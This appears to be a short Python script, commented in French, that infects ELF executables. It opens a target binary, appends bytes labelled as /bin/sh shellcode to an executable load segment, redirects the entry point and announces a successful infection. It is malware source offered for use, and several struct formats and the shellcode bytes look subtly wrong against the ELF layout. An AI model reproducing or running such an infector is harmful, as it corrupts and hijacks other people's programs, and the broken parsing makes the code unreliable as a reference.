import os
import struct

# Shellcode simple : /bin/sh
shellcode = b"\x48\x31\xc0\x48\x89\xc7\x48\x89\xc6\x48\x8d\x3d\x04\x00\x00\x00\x04\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00"

def infect_elf(file_path):
    with open(file_path, "rb+") as f:
        # Lire l'en-tête ELF (64 bits)
        f.seek(0)
        elf_header = f.read(64)
        magic, _ = struct.unpack('<4s12xH', elf_header[:16])

        # Vérification du fichier ELF
        if magic != b'\x7fELF':
            print(f"{file_path} n'est pas un fichier ELF valide.")
            return

        # Lire les informations importantes
        e_entry, e_phoff, e_phnum = struct.unpack_from('<Q8xQ6xH', elf_header, 24)
        print(f"Entrée actuelle : {hex(e_entry)}")
        
        # Lire les en-têtes de segments
        f.seek(e_phoff)
        ph_headers = [f.read(56) for _ in range(e_phnum)]

        # Chercher un segment modifiable (PT_LOAD)
        for i, ph_header in enumerate(ph_headers):
            p_type, p_offset, p_vaddr, p_filesz, p_memsz, p_flags = struct.unpack_from('<IIQQQQI', ph_header, 0)
            if p_type == 1 and (p_flags & 1):  # PT_LOAD avec permission d'exécution
                print(f"Segment exécutable trouvé : Offset={hex(p_offset)}, VAddr={hex(p_vaddr)}")
                
                # Insérer le shellcode à la fin du segment
                new_offset = p_offset + p_filesz
                f.seek(new_offset)
                f.write(shellcode)

                # Modifier l'en-tête ELF pour rediriger le point d'entrée
                new_entry = p_vaddr + p_filesz
                print(f"Nouveau point d'entrée : {hex(new_entry)}")

                # Modifier le fichier ELF pour mettre à jour le point d'entrée
                new_elf_header = bytearray(elf_header)
                struct.pack_into('<Q', new_elf_header, 24, new_entry)
                f.seek(0)
                f.write(new_elf_header)

                # Mettre à jour le segment
                new_ph_header = bytearray(ph_header)
                struct.pack_into('<QQ', new_ph_header, 32, p_filesz + len(shellcode), p_memsz + len(shellcode))
                f.seek(e_phoff + i * 56)
                f.write(new_ph_header)

                print(f"Infection réussie : {file_path}")
                return
        
        print("Aucun segment modifiable trouvé.")
